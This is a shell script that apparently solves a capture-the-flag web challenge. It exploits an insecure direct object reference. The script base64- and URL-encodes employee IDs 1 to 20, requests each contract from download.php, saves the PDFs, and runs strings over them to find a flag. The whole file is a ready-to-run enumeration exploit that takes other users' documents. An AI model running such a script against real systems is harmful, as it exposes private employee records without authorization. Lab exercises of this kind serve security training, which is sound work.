#!/usr/bin/env sh

# Function to display usage information
usage() {
    echo "Usage: $0 -u URL:PORT"
    echo "  -u    URL and port in the format URL:PORT (e.g., 83.136.254.158:49434)"
    exit 1
}

# URL Encode Function
urlencode() {
    raw="$1"
    encoded=""
    pos=1
    length=$(printf "%s" "$raw" | wc -c)

    while [ "$pos" -le "$length" ]; do
        c=$(printf "%s" "$raw" | cut -c "$pos")
        case "$c" in
            [a-zA-Z0-9.~_-])
                encoded="${encoded}${c}"
                ;;
            ' ')
                encoded="${encoded}+"
                ;;
            *)
                # Get the hexadecimal value
                hex=$(printf '%%%02X' "'$c")
                encoded="${encoded}${hex}"
                ;;
        esac
        pos=$((pos + 1))
    done

    printf '%s' "$encoded"
}

# Parse options
while getopts ":u:" opt; do
    case $opt in
        u)
            SERVER_URL_PORT="$OPTARG"
            ;;
        *)
            usage
            ;;
    esac
done

# Check if the -u option was provided
if [ -z "$SERVER_URL_PORT" ]; then
    usage
fi

# Extract URL and PORT
SERVER_IP=$(printf '%s' "$SERVER_URL_PORT" | cut -d':' -f1)
PORT=$(printf '%s' "$SERVER_URL_PORT" | cut -d':' -f2)

# Download directory
DOWNLOAD_DIR="./contracts"
mkdir -p "$DOWNLOAD_DIR" || {
    echo "Error: Could not create directory '$DOWNLOAD_DIR'."
    exit 1
}

# Loop to download files
i=1
while [ "$i" -le 20 ]; do
    echo "Requesting contract for employee #$i..."

    base64_encoded=$(printf '%s' "$i" | base64)
    url_encoded=$(urlencode "$base64_encoded")
    download_url="http://${SERVER_IP}:${PORT}/download.php?contract=${url_encoded}"
    output_file="${DOWNLOAD_DIR}/employee${i}.pdf"

    # Perform the download
    if curl -s -o "$output_file" "$download_url"; then
        if [ -s "$output_file" ]; then
            echo "Successfully downloaded: #$i -> $output_file"
        else
            echo "Failed to download: #$i. Empty file."
            rm -f "$output_file"
        fi
    else
        echo "Failed to download: #$i."
        rm -f "$output_file"
    fi

    i=$((i + 1))
done

echo "Download completed. Check the directory: '$DOWNLOAD_DIR'."

echo "Looking for the flag..."

# Search for the flag in the downloaded PDFs
for pdf in "$DOWNLOAD_DIR"/*.pdf; do
    [ -e "$pdf" ] || continue
    echo "Checking $pdf..."
    flag=$(strings "$pdf")
    if [ -n "$flag" ]; then
        echo "Flag found in: $pdf"
        echo "Flag content:"
        echo "$flag"
    else
        echo "No flag found in: $pdf"
    fi
done
